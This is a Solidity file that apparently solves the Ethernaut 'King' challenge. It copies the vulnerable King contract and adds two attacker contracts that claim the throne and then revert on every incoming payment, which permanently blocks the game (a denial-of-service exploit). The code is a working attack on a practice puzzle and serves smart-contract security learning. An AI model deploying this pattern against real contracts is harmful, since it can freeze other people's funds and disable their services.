// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Here we perform a DOS attack on the King contract. The attack is performed by creating a malicious contract that will revert every
// time it receives a payment. The attacker contract will then send a call to the "receive" function of the King contract, which will
// make the malicious contract the new king. The malicious contract will then revert, making the King contract unusable.
contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Attacker {
    King king;

    constructor(address kingAddress) {
        king = King(payable(kingAddress));
    }

    function attack() public payable {
        (bool result, ) = address(king).call{value: msg.value}("");
    }

    receive() external payable {
        revert();
    }
}

contract AttackerLowGas {
    constructor() {}

    function attack(address kingContracts) public payable {
        kingContracts.call{value: msg.value}("");
    }

    receive() external payable {
        revert();
    }
}
